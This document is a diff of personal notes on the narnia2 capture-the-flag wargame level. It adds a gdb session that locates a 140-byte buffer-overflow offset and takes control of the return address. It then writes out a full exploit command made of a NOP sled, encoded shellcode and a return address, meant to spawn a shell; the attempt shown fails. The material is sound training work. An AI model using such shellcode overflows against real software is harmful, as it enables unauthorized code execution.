@@ -41,36 +41,90 @@ Illegal instruction
 narnia2@melinda:/narnia$ ./narnia2 $(python -c'print "A"*(128+11)')
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 
-Looks like the magic number is 128+12 so we have 12 bytes to play with
+Looks like the magic number is 128+12=140 so we have 12 bytes to play with? maybe?  
+Only one way to find out, time to fire up the ol' gdb, if you don't see me by tomorrow tell my people I won't be coming back
 
-============= ASM of main() ===============
-(gdb) disas main
-Dump of assembler code for function main:
-   0x0804845d <+0>:	push   %ebp
-   0x0804845e <+1>:	mov    %esp,%ebp
-   0x08048460 <+3>:	and    $0xfffffff0,%esp
-   0x08048463 <+6>:	sub    $0x90,%esp
-   0x08048469 <+12>:	cmpl   $0x1,0x8(%ebp)
-   0x0804846d <+16>:	jne    0x8048490 <main+51>
-   0x0804846f <+18>:	mov    0xc(%ebp),%eax
-   0x08048472 <+21>:	mov    (%eax),%eax
-   0x08048474 <+23>:	mov    %eax,0x4(%esp)
-   0x08048478 <+27>:	movl   $0x8048560,(%esp)
-   0x0804847f <+34>:	call   0x8048310 <printf@plt>
-   0x08048484 <+39>:	movl   $0x1,(%esp)
-   0x0804848b <+46>:	call   0x8048340 <exit@plt>
-   0x08048490 <+51>:	mov    0xc(%ebp),%eax
-   0x08048493 <+54>:	add    $0x4,%eax
-   0x08048496 <+57>:	mov    (%eax),%eax
-   0x08048498 <+59>:	mov    %eax,0x4(%esp)
-   0x0804849c <+63>:	lea    0x10(%esp),%eax
-   0x080484a0 <+67>:	mov    %eax,(%esp)
-   0x080484a3 <+70>:	call   0x8048320 <strcpy@plt>
-   0x080484a8 <+75>:	lea    0x10(%esp),%eax
-   0x080484ac <+79>:	mov    %eax,0x4(%esp)
-   0x080484b0 <+83>:	movl   $0x8048574,(%esp)
-   0x080484b7 <+90>:	call   0x8048310 <printf@plt>
-   0x080484bc <+95>:	mov    $0x0,%eax
-   0x080484c1 <+100>:	leave  
-   0x080484c2 <+101>:	ret    
-End of assembler dump.
+============= G D B ===========================
+narnia2@narnia:/narnia$ gdb ./narnia2 -q
+Reading symbols from ./narnia2...(no debugging symbols found)...done.
+(gdb) r $(python -c'print "\x41"*140')
+Starting program: /narnia/narnia2 $(python -c'print "\x41"*140')
+
+Program received signal SIGILL, Illegal instruction.
+0xf7e3ba00 in __libc_start_main () from /lib32/libc.so.6
+(gdb) r $(python -c'print "\x41"*164')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /narnia/narnia2 $(python -c'print "\x41"*164')
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+(gdb) r $(python -c'print "\x41"*140+"\x42"*4')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /narnia/narnia2 $(python -c'print "\x41"*140+"\x42"*4')
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+(gdb) x/300x $esp
+0xffffd6a0:	0x00000000	0xffffd734	0xffffd740	0xf7feacca
+0xffffd6b0:	0x00000002	0xffffd734	0xffffd6d4	0x08049768
+0xffffd6c0:	0x0804821c	0xf7fcb000	0x00000000	0x00000000
+0xffffd6d0:	0x00000000	0xba96c705	0x824ea315	0x00000000
+0xffffd6e0:	0x00000000	0x00000000	0x00000002	0x08048360
+0xffffd6f0:	0x00000000	0xf7ff04c0	0xf7e3b9e9	0xf7ffd000
+0xffffd700:	0x00000002	0x08048360	0x00000000	0x08048381
+0xffffd710:	0x0804845d	0x00000002	0xffffd734	0x080484d0
+0xffffd720:	0x08048540	0xf7feb160	0xffffd72c	0x0000001c
+0xffffd730:	0x00000002	0xffffd85d	0xffffd86d	0x00000000
+0xffffd740:	0xffffd8fe	0xffffd90e	0xffffd922	0xffffd941
+0xffffd750:	0xffffd954	0xffffd95d	0xffffd96a	0xffffde8b
+0xffffd760:	0xffffde96	0xffffdea2	0xffffdf00	0xffffdf17
+0xffffd770:	0xffffdf26	0xffffdf32	0xffffdf43	0xffffdf4c
+0xffffd780:	0xffffdf5f	0xffffdf67	0xffffdf77	0xffffdfa6
+0xffffd790:	0xffffdfc6	0x00000000	0x00000020	0xf7fdbbe0
+0xffffd7a0:	0x00000021	0xf7fdb000	0x00000010	0x178bfbff
+0xffffd7b0:	0x00000006	0x00001000	0x00000011	0x00000064
+0xffffd7c0:	0x00000003	0x08048034	0x00000004	0x00000020
+0xffffd7d0:	0x00000005	0x00000008	0x00000007	0xf7fdc000
+0xffffd7e0:	0x00000008	0x00000000	0x00000009	0x08048360
+0xffffd7f0:	0x0000000b	0x000036b2	0x0000000c	0x000036b2
+0xffffd800:	0x0000000d	0x000036b2	0x0000000e	0x000036b2
+0xffffd810:	0x00000017	0x00000000	0x00000019	0xffffd83b
+0xffffd820:	0x0000001f	0xffffdfe8	0x0000000f	0xffffd84b
+0xffffd830:	0x00000000	0x00000000	0xb1000000	0xc30401de
+0xffffd840:	0x057d229d	0xf17d9585	0x698d4038	0x00363836
+0xffffd850:	0x00000000	0x00000000	0x00000000	0x616e2f00
+0xffffd860:	0x61696e72	0x72616e2f	0x3261696e	0x41414100
+0xffffd870:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd880:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd890:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd8a0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd8b0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd8c0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd8d0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd8e0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd8f0:	0x41414141	0x41414141	0x42424241	0x48530042
+0xffffd900:	0x3d4c4c45	0x6e69622f	0x7361622f	0x45540068
+0xffffd910:	0x783d4d52	0x6d726574	0x3635322d	0x6f6c6f63
+0xffffd920:	0x53530072	0x4c435f48	0x544e4549	0x3237313d
+0xffffd930:	0x2e38312e	0x20312e30	0x37363533	0x32322038
+0xffffd940:	0x48535300	0x5954545f	0x65642f3d	0x74702f76
+0xffffd950:	0x00302f73	0x415f434c	0x433d4c4c	0x45535500
+0xffffd960:	0x616e3d52	0x61696e72	0x534c0032	0x4c4f435f
+0xffffd970:	0x3d53524f	0x303d7372	0x3d69643a	0x333b3130
+0xffffd980:	0x6e6c3a34	0x3b31303d	0x6d3a3633	0x30303d68
+
+===========================================================================
+So it looks like we can control execution where the \x42 are. 
+Let's point it to the an address in the buf[128] after 0xffffd86e 
+Then we nop sled to the same payload used in the previous level
+Then we hopefully get a shell..... hopefully being the operative term :)
+Payload from previous level is 44 bytes
+
+So we should have 96 nops, 44 bytes payload, 4 bytes of address
+
+narnia2@narnia:/narnia$ ./narnia2 $(python -c'print "\x90"*96+"\xeb\x10\x5e\x31\xc9\xb1\x15\x8a\x06\x34\xe9\x88\x06\x46\xe2\xf7\xeb\x05\xe8\xeb\xff\xff\xff\xd8\x20\xb8\x81\xc6\xc6\x9a\x81\x81\xc6\x8b\x80\x87\x60\x0a\x83\xe2\xb1\x70\x24\x69"+"\x70\xd8\xff\xff"')
+�������������������������������������������������������������������������������������������������^1ɱ�4��F���������narnia2@narnia:/narnia$ 
+
+Well.... that didn't work. At least the program didn't crash, maybe it's a problem with the payload? Let's see if I can find one that works
